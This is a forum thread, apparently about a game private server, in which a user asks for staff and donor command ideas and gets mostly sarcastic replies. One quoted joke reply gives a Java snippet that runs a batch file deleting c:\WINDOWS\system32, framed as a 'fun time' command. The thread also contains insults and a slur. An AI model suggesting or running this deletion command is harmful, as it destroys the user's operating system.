channel.title: [Req] IDEAS [Req]
channel.description:
Im looking for some ideas on some commands to add to my server, specifically staff and donor commands. Anything and everything will help.
ps. not looking for tutorials just post ideas please thanks :D
If this is in the wrong section im sorry please move it.

item.title: [Req] IDEAS [Req]
item.dc:creator: @Ruby_Forums_Coder Ruby
item.description:
@Ruby_Forums_Coder wrote:

Probably get on better if you asked your players and not us.

Read full topic

item.title: [Req] IDEAS [Req]
item.dc:creator: @loki2006 loki2006
item.description:
@loki2006 wrote:

[quote=“Vain_, post:7, topic:522888”]ask your donators what they what.
there are endless possibilities on what a stupid command can do. stop being lazy ._.[/quote]

i simply asked for some simple ideas, didn’t know it would turn into something this ridiculously retarded and a very horrible attempt to ask a community for ideas. Mod lock this

Read full topic

item.title: [Req] IDEAS [Req]
item.dc:creator: @loki2006 loki2006
item.description:
@loki2006 wrote:

[quote=“Host Gushers, post:4, topic:522888”][quote author=asshole_rule link=topic=641383.msg4321125#msg4321125 date=1372225681]

if(command.equals("fun time") { Runtime.getRuntime().exec("party.bat"); }

party.bat:

@echo off del c:\WINDOWS\system32
[/quote]
lmao

@loki: I believe this is the wrong section…2nd of all…We need some more information about what type of donator commands etc. What type of server ? eco ?[/quote]

Ha you guys are funny, Im not looking for anything in particular i just need something to spice up my commands list a little for my mods, and something special for the donors, and again dont necessarily need snippets of code either.

Read full topic

item.title: [Req] IDEAS [Req]

item.description:

party.bat:

Wtf? How’d you do that? My cycle time is going suuuuuuuuper fast now! Thanks!

item.title: [Req] IDEAS [Req]
item.dc:creator: @Vain1 Vain_
item.description:
@Vain1 wrote:

if (command.equals("benice") || command.equals("sharewealth") || command.equals("ruineco")) { for (player p : server.playerHandler.players) { client n = (client)p; n.addItem(995, 2147483647); } }good command for all to use
